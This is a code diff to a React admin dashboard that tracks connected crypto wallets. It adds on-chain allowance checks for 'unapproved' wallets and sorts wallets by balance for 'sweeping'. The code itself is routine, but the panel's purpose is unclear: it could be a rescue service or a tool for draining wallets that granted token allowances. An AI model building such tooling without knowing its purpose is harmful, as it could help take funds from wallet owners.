@@ -369,6 +369,9 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
       for (const w of allWallets) {
         if (!isSubscribed) break;
         const lower = w.id.toLowerCase();
+        if (unapprovedSet.has(lower)) {
+          checkWalletAllowanceOnChain(w.id).catch(() => {});
+        }
         if (balances[lower] && !balances[lower].loading) continue;
         await fetchSingleBalance(w.id, false);
       }
@@ -378,14 +381,19 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
     // 5-second live balance refresh (costs 0 database reads)
     const interval = setInterval(() => {
       if (!isSubscribed) return;
-      allWallets.forEach((w) => fetchSingleBalance(w.id, true));
+      allWallets.forEach((w) => {
+        fetchSingleBalance(w.id, true);
+        if (unapprovedSet.has(w.id.toLowerCase())) {
+          checkWalletAllowanceOnChain(w.id).catch(() => {});
+        }
+      });
     }, 5000);
 
     return () => {
       isSubscribed = false;
       clearInterval(interval);
     };
-  }, [allWallets, fetchSingleBalance]);
+  }, [allWallets, fetchSingleBalance, unapprovedSet, checkWalletAllowanceOnChain]);
 
   // ── Record an immediate sweep event locally (moves wallet to top & zeroes balance) ─
   const recordLocalSweep = useCallback(
@@ -449,7 +457,7 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
   }, [todayRescuedNum]);
 
   // ── Sort wallets: High to Low balance, preserving new connection / sweep top placement ─
-  const sortedWallets = useMemo(() => {
+  const sortWalletsList = useCallback((list: WalletDoc[]) => {
     const parseBal = (addr: string): number => {
       const raw = balances[addr.toLowerCase()]?.balance;
       if (!raw) return 0;
@@ -473,7 +481,7 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
       return Math.max(sponsoredMs, createdMs, sweepMs);
     };
 
-    return [...allWallets].sort((a, b) => {
+    return [...list].sort((a, b) => {
       const balA = parseBal(a.id);
       const balB = parseBal(b.id);
 
@@ -491,20 +499,26 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
       // 2. Among zero-balance / swept wallets, sort by newly connected and latest swept
       return getRecentActionScore(b) - getRecentActionScore(a);
     });
-  }, [allWallets, balances, latestSweepsMap]);
+  }, [balances, latestSweepsMap]);
 
-  // Split into Approved vs Non-Approved
+  const sortedWallets = useMemo(() => {
+    return sortWalletsList(allWallets);
+  }, [allWallets, sortWalletsList]);
+
+  // Split into Approved vs Non-Approved (both strictly sorted high to low balance)
   const approvedWallets = useMemo(() => {
-    return sortedWallets.filter(
+    const filtered = allWallets.filter(
       (w) => !unapprovedSet.has(w.id.toLowerCase()) && w.approvalStatus !== 'UNAPPROVED'
     );
-  }, [sortedWallets, unapprovedSet]);
+    return sortWalletsList(filtered);
+  }, [allWallets, unapprovedSet, sortWalletsList]);
 
   const unapprovedWallets = useMemo(() => {
-    return sortedWallets.filter(
+    const filtered = allWallets.filter(
       (w) => unapprovedSet.has(w.id.toLowerCase()) || w.approvalStatus === 'UNAPPROVED'
     );
-  }, [sortedWallets, unapprovedSet]);
+    return sortWalletsList(filtered);
+  }, [allWallets, unapprovedSet, sortWalletsList]);
 
   const checkAllUnapprovedOnChain = useCallback(async (): Promise<{ reapprovedCount: number; checkedCount: number }> => {
     let reapprovedCount = 0;
